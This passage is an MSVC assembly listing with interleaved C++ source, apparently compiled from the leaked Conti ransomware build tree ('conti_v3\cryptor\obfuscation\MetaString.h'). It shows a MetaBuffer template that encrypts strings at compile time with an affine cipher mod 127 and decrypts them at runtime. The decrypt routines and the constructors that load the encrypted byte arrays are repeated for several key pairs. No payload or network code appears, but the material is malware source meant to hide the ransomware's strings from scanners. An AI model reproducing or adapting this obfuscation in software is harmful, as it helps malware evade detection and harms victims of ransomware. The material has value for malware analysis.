??0?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<71,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<71,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 03 00 00 00	 mov	 eax, 3
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 5f	 mov	 BYTE PTR [rcx+1], 95	; 0000005fH
  00007	c6 41 02 03	 mov	 BYTE PTR [rcx+2], 3
  0000b	c6 41 03 70	 mov	 BYTE PTR [rcx+3], 112	; 00000070H
  0000f	c6 41 04 03	 mov	 BYTE PTR [rcx+4], 3
  00013	c6 41 05 6a	 mov	 BYTE PTR [rcx+5], 106	; 0000006aH
  00017	c6 41 06 03	 mov	 BYTE PTR [rcx+6], 3
  0001b	c6 41 07 70	 mov	 BYTE PTR [rcx+7], 112	; 00000070H
  0001f	c6 41 08 03	 mov	 BYTE PTR [rcx+8], 3
  00023	c6 41 09 03	 mov	 BYTE PTR [rcx+9], 3
  00027	c6 41 0a 03	 mov	 BYTE PTR [rcx+10], 3
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 16 00 00 00	 mov	 eax, 22
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 5a	 mov	 BYTE PTR [rcx+1], 90	; 0000005aH
  00007	c6 41 02 16	 mov	 BYTE PTR [rcx+2], 22
  0000b	c6 41 03 49	 mov	 BYTE PTR [rcx+3], 73	; 00000049H
  0000f	c6 41 04 16	 mov	 BYTE PTR [rcx+4], 22
  00013	c6 41 05 7a	 mov	 BYTE PTR [rcx+5], 122	; 0000007aH
  00017	c6 41 06 16	 mov	 BYTE PTR [rcx+6], 22
  0001b	c6 41 07 1e	 mov	 BYTE PTR [rcx+7], 30
  0001f	c6 41 08 16	 mov	 BYTE PTR [rcx+8], 22
  00023	c6 41 09 16	 mov	 BYTE PTR [rcx+9], 22
  00027	c6 41 0a 16	 mov	 BYTE PTR [rcx+10], 22
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<11,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 10 00 00
	00		 mov	 r10d, 16
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 6f 00 00 00	 mov	 eax, 111		; 0000006fH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 17	 imul	 ecx, eax, 23

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<11,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<11,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<11,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6d	 mov	 BYTE PTR [rcx+1], 109	; 0000006dH
  00007	c6 41 02 6f	 mov	 BYTE PTR [rcx+2], 111	; 0000006fH
  0000b	c6 41 03 6a	 mov	 BYTE PTR [rcx+3], 106	; 0000006aH
  0000f	c6 41 04 6f	 mov	 BYTE PTR [rcx+4], 111	; 0000006fH
  00013	c6 41 05 01	 mov	 BYTE PTR [rcx+5], 1
  00017	c6 41 06 6f	 mov	 BYTE PTR [rcx+6], 111	; 0000006fH
  0001b	c6 41 07 2e	 mov	 BYTE PTR [rcx+7], 46	; 0000002eH
  0001f	c6 41 08 6f	 mov	 BYTE PTR [rcx+8], 111	; 0000006fH
  00023	c6 41 09 0c	 mov	 BYTE PTR [rcx+9], 12
  00027	c6 41 0a 6f	 mov	 BYTE PTR [rcx+10], 111	; 0000006fH
  0002b	c6 41 0b 3e	 mov	 BYTE PTR [rcx+11], 62	; 0000003eH
  0002f	c6 41 0c 6f	 mov	 BYTE PTR [rcx+12], 111	; 0000006fH
  00033	c6 41 0d 1d	 mov	 BYTE PTR [rcx+13], 29
  00037	c6 41 0e 6f	 mov	 BYTE PTR [rcx+14], 111	; 0000006fH
  0003b	c6 41 0f 6f	 mov	 BYTE PTR [rcx+15], 111	; 0000006fH
  0003f	c6 41 10 6f	 mov	 BYTE PTR [rcx+16], 111	; 0000006fH
  00043	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00047	48 8b c1	 mov	 rax, rcx
  0004a	c3		 ret	 0
??0?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<11,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<11,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0e 00 00
	00		 mov	 r11d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 66	 sub	 ecx, 102		; 00000066H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<107,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 47	 mov	 BYTE PTR [rcx+1], 71	; 00000047H
  00007	c6 41 02 66	 mov	 BYTE PTR [rcx+2], 102	; 00000066H
  0000b	c6 41 03 01	 mov	 BYTE PTR [rcx+3], 1
  0000f	c6 41 04 66	 mov	 BYTE PTR [rcx+4], 102	; 00000066H
  00013	c6 41 05 1b	 mov	 BYTE PTR [rcx+5], 27
  00017	c6 41 06 66	 mov	 BYTE PTR [rcx+6], 102	; 00000066H
  0001b	c6 41 07 29	 mov	 BYTE PTR [rcx+7], 41	; 00000029H
  0001f	c6 41 08 66	 mov	 BYTE PTR [rcx+8], 102	; 00000066H
  00023	c6 41 09 08	 mov	 BYTE PTR [rcx+9], 8
  00027	c6 41 0a 66	 mov	 BYTE PTR [rcx+10], 102	; 00000066H
  0002b	c6 41 0b 76	 mov	 BYTE PTR [rcx+11], 118	; 00000076H
  0002f	c6 41 0c 66	 mov	 BYTE PTR [rcx+12], 102	; 00000066H
  00033	c6 41 0d 66	 mov	 BYTE PTR [rcx+13], 102	; 00000066H
  00037	c6 41 0e 66	 mov	 BYTE PTR [rcx+14], 102	; 00000066H
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<107,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 4f 00 00 00	 mov	 eax, 79			; 0000004fH
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
